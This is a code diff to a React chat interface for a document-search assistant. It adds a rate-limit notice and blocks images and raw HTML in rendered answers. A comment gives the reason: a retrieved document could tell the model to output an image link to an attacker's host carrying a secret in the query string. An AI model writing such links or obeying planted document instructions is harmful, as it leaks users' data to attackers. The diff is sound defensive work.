@@ -1,5 +1,5 @@
 import { useEffect, useRef, useState, type FormEvent, type KeyboardEvent } from "react"
-import ReactMarkdown from "react-markdown"
+import ReactMarkdown, { type Components } from "react-markdown"
 import remarkGfm from "remark-gfm"
 import {
   ArrowUp,
@@ -15,7 +15,8 @@ import {
 
 import { Badge } from "@/components/ui/badge"
 import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
-import { api, type ChatReply, type Role, type Source, type StreamEvent } from "@/lib/api"
+import { Clock } from "lucide-react"
+import { api, ApiError, type ChatReply, type Role, type Source, type StreamEvent } from "@/lib/api"
 
 // One step the assistant took, shown live while it works ("Searching company docs").
 interface LiveStep {
@@ -31,6 +32,7 @@ interface Message {
   text: string
   reply?: ChatReply
   error?: boolean
+  limited?: string // turned away by a rate limit: the server's words, shown as a notice
   streaming?: boolean
   status?: string
   steps?: LiveStep[]
@@ -143,6 +145,26 @@ function StepsPanel({ message }: { message: Message }) {
   )
 }
 
+// Too many questions in the last minute: a pause, not a failure, so no red.
+function LimitNotice({ text }: { text: string }) {
+  return (
+    <div className="flex items-start gap-2.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5 text-sm">
+      <Clock className="mt-0.5 size-4 shrink-0 text-muted-foreground" />
+      <div className="min-w-0 space-y-0.5">
+        <p className="font-medium">Give it a moment</p>
+        <p className="text-muted-foreground">{text}</p>
+      </div>
+    </div>
+  )
+}
+
+// Answers never load images or render raw HTML: a document could tell the model to
+// write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
+// An image shows as its alt text instead.
+const ANSWER_MARKDOWN: Components = {
+  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
+}
+
 function AssistantMessage({ message }: { message: Message }) {
   const reply = message.reply
   return (
@@ -152,6 +174,7 @@ function AssistantMessage({ message }: { message: Message }) {
       </div>
       <div className="min-w-0 flex-1 space-y-3 pt-1">
         <StepsPanel message={message} />
+        {message.limited && <LimitNotice text={message.limited} />}
 
         {message.text && (
           <div
@@ -161,7 +184,9 @@ function AssistantMessage({ message }: { message: Message }) {
                 : "max-w-none text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5"
             }
           >
-            <ReactMarkdown remarkPlugins={[remarkGfm]}>{message.text}</ReactMarkdown>
+            <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={ANSWER_MARKDOWN}>
+              {message.text}
+            </ReactMarkdown>
             {message.streaming && (
               <span className="ml-0.5 inline-block h-4 w-1.5 translate-y-0.5 animate-pulse rounded-sm bg-foreground/60" />
             )}
@@ -247,6 +272,12 @@ export function ChatView({ role }: { role: Role }) {
         steps: (msg.steps ?? []).map((st) => ({ ...st, done: true })),
       }))
     } catch (err) {
+      if (err instanceof ApiError && err.status === 429) {
+        // Nothing was asked: give the question back to send again in a moment.
+        update((msg) => ({ ...msg, limited: err.message, streaming: false }))
+        setInput((current) => current || q)
+        return
+      }
       update((msg) => ({
         ...msg,
         text: err instanceof Error ? err.message : "Something went wrong.",
